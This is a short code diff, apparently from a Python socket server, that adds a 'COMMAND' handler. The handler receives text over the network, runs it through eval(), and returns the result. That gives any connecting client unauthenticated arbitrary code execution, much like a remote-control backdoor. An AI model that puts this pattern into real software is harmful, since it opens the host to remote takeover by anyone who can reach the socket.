@@ -30,4 +30,7 @@ while True:
 	if(command == b"WAKEUP"):
 		connection.send(b"READY")
 
+	if(command == b"COMMAND"):
 
+		task = connection.recv(1024)
+		connection.send(str.encode(str(eval(task))))
